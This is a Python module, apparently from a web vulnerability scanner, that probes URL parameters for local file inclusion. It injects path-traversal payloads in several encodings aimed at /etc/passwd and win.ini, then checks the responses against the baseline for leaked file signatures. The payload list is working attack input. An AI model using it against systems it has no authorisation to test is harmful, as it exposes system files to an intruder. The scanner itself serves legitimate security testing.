"""Native check: Local File Inclusion / path traversal.

Injects traversal payloads (several depths and encodings, Linux and Windows)
into parameters and confirms only when the *target file's* signature appears in
the response and wasn't already in the baseline — so a hit means a real file
read, not reflection.
"""

from __future__ import annotations

import re
import urllib.parse

from ..models import Finding, Severity
from ..utils.concurrency import parallel_map
from ..utils.net import HttpClient, build_proof, in_scope
from . import injpoints
from ._common import point_baselines
from .crlf import _inject  # raw param injection that preserves %-encoding

_SOURCE = "native:lfi"

_LINUX_RE = re.compile(r"root:.*?:0:0:")
_WIN_MARKERS = ("[fonts]", "[extensions]", "for 16-bit app support", "[mci extensions]")

# Traversal payloads: depth + encoding variants for /etc/passwd and win.ini.
_PAYLOADS = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "....\\\\....\\\\....\\\\windows\\win.ini",
)

# Parameters that commonly reference a file/path.
_FILE_PARAMS = (
    "file", "path", "page", "template", "include", "inc", "doc", "document",
    "download", "read", "load", "view", "name", "img", "image", "src",
    "filename", "filepath", "dir", "folder", "conf", "config", "pdf", "report",
    "lang", "locale", "style",
)


def detect(text: str, baseline: str = "") -> str | None:
    """Return which file leaked ("linux"/"windows"), or None."""
    if _LINUX_RE.search(baseline) or any(m in baseline.lower() for m in _WIN_MARKERS):
        return None  # signature already present without us -> unreliable
    if _LINUX_RE.search(text):
        return "linux:/etc/passwd"
    low = text.lower()
    if any(m in low for m in _WIN_MARKERS):
        return "windows:win.ini"
    return None


def _candidates(result, cap: int) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    seen: set[tuple[str, str, str]] = set()

    def add(url: str, param: str) -> None:
        parts = urllib.parse.urlsplit(url)
        key = (parts.netloc, parts.path, param)
        if key not in seen:
            seen.add(key)
            out.append((url, param))

    for url in result.urls:
        if not in_scope(url, result.target.host):
            continue
        parts = urllib.parse.urlsplit(url)
        for key, _ in urllib.parse.parse_qsl(parts.query, keep_blank_values=True):
            add(url, key)

    base = result.target.base_url
    if base:
        for param in _FILE_PARAMS:
            add(base.rstrip("/") + "/", param)

    return out[:cap]


#: Literal payloads work over any transport (send() encodes them); the
#: pre-encoded bypass payloads (with %xx) are query-only and sent raw.
_LITERAL_PAYLOADS = tuple(p for p in _PAYLOADS if "%" not in p)
_ENCODED_PAYLOADS = tuple(p for p in _PAYLOADS if "%" in p)


def check(result, config, client: HttpClient, ui) -> list[Finding]:
    candidates = injpoints.build(result, result.target.host, base_param_names=_FILE_PARAMS, cap=25)
    if not candidates:
        return []

    baseline_cache = point_baselines(client, candidates, config.concurrency)

    def probe(point) -> list[Finding]:
        param = point.param
        baseline = baseline_cache.get(injpoints.baseline_key(point), "")
        payloads = [(p, False) for p in _LITERAL_PAYLOADS]
        if point.kind == "query":
            payloads += [(p, True) for p in _ENCODED_PAYLOADS]
        for payload, raw in payloads:
            resp = injpoints.send(client, point, payload, raw=raw)
            if not resp.ok:
                continue
            leaked = detect(resp.text, baseline)
            if leaked:
                return [Finding(
                    title=f"Local File Inclusion / path traversal in parameter '{param}' ({point.kind})",
                    severity=Severity.HIGH,
                    target=result.target.host,
                    category="lfi",
                    location=point.location,
                    description=(
                        f"The '{param}' parameter ({point.kind}) is used to read a file: a "
                        f"traversal payload returned the contents of {leaked}. An attacker "
                        "can read arbitrary local files."
                    ),
                    remediation="Resolve paths against a fixed base directory, reject "
                    "'..' and absolute paths, and use an allowlist of filenames.",
                    evidence=f"payload={payload} leaked {leaked}",
                    source=_SOURCE,
                    extra={"parameter": param, "file": leaked, "transport": point.kind},
                    proof=build_proof(resp),
                )]
        return []

    findings: list[Finding] = []
    for _c, found in parallel_map(probe, candidates, workers=config.concurrency):
        if found:
            findings.extend(found)
    return findings
